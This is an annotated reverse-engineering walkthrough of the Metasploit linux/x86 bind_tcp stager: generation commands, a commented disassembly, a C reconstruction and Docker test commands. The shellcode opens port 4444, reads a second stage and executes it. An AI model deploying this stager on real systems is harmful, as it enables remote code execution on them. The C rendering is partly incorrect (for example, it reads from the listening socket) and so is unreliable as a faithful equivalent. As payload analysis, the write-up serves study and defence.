# Metasploit linux/x86/shell/bind_tcp

## Stager

Source: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/linux/bind_tcp.rb

### Generate
```
msf5 > use payload/linux/x86/shell/bind_tcp
msf5 payload(linux/x86/shell/bind_tcp) > generate -f raw -o stage1.bin
```

### Disassembled Content
```
$ r2 -a x86 -b 32 -c 'pd' stage1.bin
            0x00000000      6a7d           push 0x7d           ; syscall #125: int mprotect(void *addr, size_t len, int prot);
            0x00000002      58             pop eax
            0x00000003      99             cdq                 ; edx = 0
            0x00000004      b207           mov dl, 7           ; prot = PROT_READ(0x04) | PROT_WRITE(0x02) | PROT_EXEC(0x01)
            0x00000006      b900100000     mov ecx, 0x1000     ; len = 4096
            0x0000000b      89e3           mov ebx, esp        ;
            0x0000000d      6681e300f0     and bx, 0xf000      ; addr = esp & 0xfffff000
            0x00000012      cd80           int 0x80        !!! ; mprotect(esp&0xfffff000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC)

            0x00000014      31db           xor ebx, ebx        ; ebx = 0
            0x00000016      f7e3           mul ebx             ; eax = 0, edx = 0
            0x00000018      53             push ebx            ; protocol = IPPROTO_IP(0)   00000000<
            0x00000019      43             inc ebx             ; call = SYS_SOCKET
            0x0000001a      53             push ebx            ; type = SOCK_STREAM(1)      00000000|00000001<
            0x0000001b      6a02           push 2              ; domain = AF_INET(2)        00000000|00000001|00000002<
            0x0000001d      89e1           mov ecx, esp        ; args = esp
            0x0000001f      b066           mov al, 0x66        ; syscall #102: int socketcall(int call, unsigned long *args) || int socket(int domain, int type, int protocol);
            0x00000021      cd80           int 0x80        !!! ; socketcall(SYS_SOCKET, esp) || socket(AF_INET, SOCK_STREAM, 0)

            0x00000023      51             push ecx            ; old_esp = esp              00000000|00000001|00000002|ffffdff4<
            0x00000024      6a04           push 4              ; optlen = 4                 00000000|00000001|00000002|ffffdff4|00000004<
            0x00000026      54             push esp            ; *optval = &optlen          00000000|00000001|00000002|ffffdff4|00000004|ffffdfec<
            0x00000027      6a02           push 2              ; optname = SO_REUSEADDR(2)  00000000|00000001|00000002|ffffdff4|00000004|ffffdfec|00000002<
            0x00000029      6a01           push 1              ; level = SOL_SOCKET(1)      00000000|00000001|00000002|ffffdff4|00000004|ffffdfec|00000002|00000001<
            0x0000002b      50             push eax            ; sockfd = eax               00000000|00000001|00000002|ffffdff4|00000004|ffffdfec|00000002|00000001|[sockfd]<
            0x0000002c      97             xchg eax, edi       ; edi = [sockfd]
            0x0000002d      89e1           mov ecx, esp        ; args = esp
            0x0000002f      6a0e           push 0xe            ; 14                         00000000|00000001|00000002|ffffdff4|00000004|ffffdfec|00000002|00000001|[sockfd]|0000000e<
            0x00000031      5b             pop ebx             ; call = SYS_SETSOCKOPT(14)  00000000|00000001|00000002|ffffdff4|00000004|ffffdfec|00000002|00000001|[sockfd]<
            0x00000032      6a66           push 0x66           ; 'f' ; 102
            0x00000034      58             pop eax             ; syscall #102: int socketcall(int call, unsigned long *args) || int setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);
            0x00000035      cd80           int 0x80        !!! ; socketcall(SYS_SETSOCKOPT, *esp) || setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optlen, optlen)

            0x00000037      97             xchg eax, edi       ; eax = [sockfd]
            0x00000038      83c414         add esp, 0x14                                    00000000|00000001|00000002|ffffdff4<
            0x0000003b      59             pop ecx             ; ecx = old_esp              00000000|00000001|00000002<
            0x0000003c      5b             pop ebx             ; call = SYS_BIND(2)         00000000|00000001<
            0x0000003d      5e             pop esi             ; esi = 1                    00000000<
            0x0000003e      52             push edx            ; 0x00000000     sockaddr_in.in_addr.s_addr=0.0.0.0                            00000000|00000000<
            0x0000003f      680200115c     push 0x5c110002     ; 0x5c110002     sockaddr_in.sin_port=4444, sockaddr_in.sin_family=AF_INET(2)  00000000|00000000|5c110002<
            0x00000044      6a10           push 0x10           ; addrlen = 16               00000000|00000000|5c110002|00000010<
            0x00000046      51             push ecx            ; sockaddr_in = old_esp      00000000|00000000|5c110002|00000010|ffffdff4<
            0x00000047      50             push eax            ; sockfd                     00000000|00000000|5c110002|00000010|ffffdff4|[sockfd]<
            0x00000048      89e1           mov ecx, esp        ; args = esp
            0x0000004a      6a66           push 0x66           ; 'f' ; 102
            0x0000004c      58             pop eax             ; syscall #102: int socketcall(int call, unsigned long *args) || int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
            0x0000004d      cd80           int 0x80        !!! ; bind(sockfd, const struct sockaddr *addr, socklen_t addrlen);

            0x0000004f      d1e3           shl ebx, 1          ; call = SYS_LISTEN(4)       00000000|00000000|5c110002|00000010|ffffdff4|[sockfd]<
            0x00000051      b066           mov al, 0x66        ; syscall #102: int socketcall(int call, unsigned long *args) || int listen(int sockfd, int backlog);
            0x00000053      cd80           int 0x80        !!! ; listen(sockfd, 0xffffdff4)

            0x00000055      50             push eax            ;                            00000000|00000000|5c110002|00000010|ffffdff4|[sockfd]|00000000<
            0x00000056      43             inc ebx             ; call = SYS_ACCEPT(5)
            0x00000057      b066           mov al, 0x66        ; syscall #102: int socketcall(int call, unsigned long *args) || int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
            0x00000059      895104         mov dword [ecx + 4], edx                         00000000|00000000|5c110002|00000010|ffffdff4|[sockfd]<
            0x0000005c      cd80           int 0x80        !!! ; accept(sockfd, 0xffffdff4, 0x10)

            0x0000005e      93             xchg eax, ebx       ; eax = 5, ebx = [sockfd_] (of the accepted socket)
            0x0000005f      b60c           mov dh, 0xc         ; edx = 3072
            0x00000061      b003           mov al, 3           ; syscall #3: ssize_t read(int fd, void *buf, size_t count);
            0x00000063      cd80           int 0x80        !!! ; read(sockfd, ecx, 3072)

            0x00000065      87df           xchg edi, ebx       ; edi = [sockfd_], ebx = 0x00000000
            0x00000067      5b             pop ebx             ; ebx = 0x00000000           00000000|00000000|5c110002|00000010|ffffdff4|[sockfd]<
            0x00000068      b006           mov al, 6           ; syscall #6: int close(int fd);
            0x0000006a      cd80           int 0x80        !!! ; close(0)

            0x0000006c      ffe1           jmp ecx
            0x0000006e      ff             invalid
            0x0000006f      ff             invalid
            0x00000070      ff             invalid
```

### Reconstructing with C Code:

```c
#include <stdint.h>
#include <sys/mman.h>
#include <stdio.h>
#include <error.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char* argv[]) {
        uint32_t esp;
        int sockfd;
        int optlen;
        struct sockaddr_in addr;

        asm("mov %%esp, %0" : "=r" (esp));
        mprotect(esp&0xfffff000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC);

        sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

        optlen = 4;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optlen, optlen);

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(4444);
        bind(sockfd, (struct sockaddr *) &addr, 16);

        listen(sockfd, esp);
        accept(sockfd, &addr, 16);
        read(sockfd, (char*)&addr, 3072);

        ((void(*)(void))&addr)();

        return 0;
}
```

```
# mkdir /tmp/shared
# docker run -it --rm --name deleteme -v /tmp/shared:/shared --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -p2000:2000 ubuntu
root@51d604030a59:/# apt install -y build-essential libc6-i386 gcc-multilib
root@51d604030a59:/# gcc -m32 test.c -o test
root@51d604030a59:/# setarch `uname -m` -R /shared/test
```

## References
 * [Linux syscall table](http://syscalls.kernelgrok.com/)
 * [mprotect(2)](http://man7.org/linux/man-pages/man2/mprotect.2.html)
 * [socket(2)](http://man7.org/linux/man-pages/man2/socket.2.html)
 * [linux/net.h](https://github.com/torvalds/linux/blob/master/include/uapi/linux/net.h)
 * [setsockopt(3p)](http://man7.org/linux/man-pages/man3/setsockopt.3p.html)
 * [sendmsg(3p)](http://man7.org/linux/man-pages/man3/sendmsg.3p.html)
 * [struct sockaddr and pals](https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html)